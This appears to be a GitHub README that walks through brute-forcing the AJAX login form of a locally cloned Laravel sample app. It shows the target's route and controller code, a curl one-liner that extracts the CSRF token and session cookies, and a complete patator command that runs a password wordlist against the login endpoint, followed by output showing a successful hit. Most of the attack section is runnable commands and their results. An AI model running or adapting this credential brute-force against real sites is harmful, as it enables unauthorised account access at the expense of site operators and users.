# Brute-force-Laravel-Ajax-form
Bruteforce laravel forms with has ajax login checks

Route</br>

Route::post('/login/user', 'CustomLoginController@loginUser'); </br>

LoginController</br>
<pre>
public function loginUser(Request $request)
    {
    	
    	$email	       = $request->email;
    	$password      = $request->password;
    	$rememberToken = $request->remember;
      
    	// now we use the Auth to Authenticate the users Credentials
		  // Attempt Login for members
      
      if (Auth::guard('member')->attempt(['email' => $email, 'password' => $password], $rememberToken))
      {
              $msg = array(
                'status'  => 'success',
                'message' => 'Login Successful'
              );
              return response()->json($msg);
      } 
      else
      {
          $msg = array(
            'status'  => 'error',
            'message' => 'Login Fail !'
          );
          return response()->json($msg);
      }
    }
</pre>

We know well all the login comes with CSRF </br>

Cookies = $(curl -s -c ajax.cookie "127.0.0.1:8000/login.php" | awk -F 'value=' '/_token/ {print $2}' | cut -d "'" -f2)</br>

This file will generate a file file with session and CSRF, copy those and use with the python script

<pre>
Javascript send data
        function LoginUser()
        {
            var token    = $("input[name=_token]").val();
            var email    = $("input[name=email]").val();
            var password = $("input[name=password]").val();

            var data = {
                _token:token,
                email:email,
                password:password
            };

            // Ajax Post 
            $.ajax({
                type: "post",
                url: "/login/user",
                data: data,
                cache: false,
                success: function (data)
                {
                    console.log('login request sent !');
                    console.log('status: ' +data.status);
                    console.log('message: ' +data.message);
                },
                error: function (data){
                    alert('Fail to run Login..');
                }
            });

            return false;
        }
   </pre>
   <pre>
   our html looks like this
      <form id="login-form" method="post" onsubmit="return LoginUser()" role="form" style="display: block;">
      
   it has hidden input field sets the _token value which checks in Login Controller
    
      name="_token" value="HEmuStR1wyJ4GAvE4zVwQ9nq14ZZ0YGw5yWHncIp
      
      type="text" name="email"
                                                                          
      type="password" name="password"
                                         
 Finally our Require fields to bruteforce this login is 
  1 => _token
  2 => email
  3 => Password
  4 => XSRF-TOKEN
  5 => laravel_session 
   
   BruteForce with patator now
   
                      time  patator  http_fuzz  method=POST url="http://127.0.0.1:8000/login/user"  0=/usr/share/wordlists/fasttrack.txt body="email=hello@gmail.com&password=FILE0&_token=HEmuStR1wyJ4GAvE4zVwQ9nq14ZZ0YGw5yWHncIp" header="Cookie: XSRF-TOKEN=eyJpdiI6IkVwUGh4YmY4eFRqT2JEeFhjXC9xV2xnPT0iLCJ2YWx1ZSI6Ikh4cEhreGxHT1JBT3U1T2xQWE1kQ3VlZ3g3WldIWW04djFHSlRhamdCNWZLcWNaRVFiUXNCdnRoTjhKWWl6YStKa09lOWRkekJ3UkNEWk9ybEhheVNBPT0iLCJtYWMiOiI2NmI2ZWY2MDIwZTkyYTU3ZTczYWFiYWMwZTQwYTRmZDMwYTdlMjI0MzA0ZWRiM2RlN2VmMDU5NGE4ZWQ3N2U4In0%3D; laravel_session=eyJpdiI6Ilwvck9UQndqeHpnekVtYnp0THIwRlwvQT09IiwidmFsdWUiOiI4cFJYaXVzcFwvcVBpdW9BMTJ4cnVcL2FrUnhETUxMa2tiZ1Q0OEpYTzlDZzVSUm9KV0xSdVhrNFpLMVwvZWwxMjhKTVdKcHc0MTlBVzBcLzVxUkpKT0FaZHc9PSIsIm1hYyI6IjNlNWI4YWMzYWY1MTRhMjBhYTZjYmZmNjFjYTdjYjRjMzVjY2U2OGMyZDZhY2JjY2VkZTg2MzIxZmEyMjE0MjcifQ%3D%3D" -x ignore:fgrep=Fail accept_cookie=0
                      
Result :
        03:28:13 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-12-23 03:28 IST
03:28:13 patator    INFO -                                                                              
03:28:13 patator    INFO - code size:clen       time | candidate                          |   num | mesg
03:28:13 patator    INFO - -----------------------------------------------------------------------------
03:28:33 patator    INFO - 200  1016:-1        0.838 | hello                              |   223 | HTTP/1.1 200 OK
03:28:33 patator    INFO - Hits/Done/Skip/Fail/Size: 1/223/0/0/223, Avg: 11 r/s, Time: 0h 0m 20s

real	0m21.449s
user	0m1.595s
sys	0m0.631s

Source code for the laravel app https://github.com/topza1412/Laravel-ajax-login-register

I cloned randomly and tested my skill !!!!..

</pre>
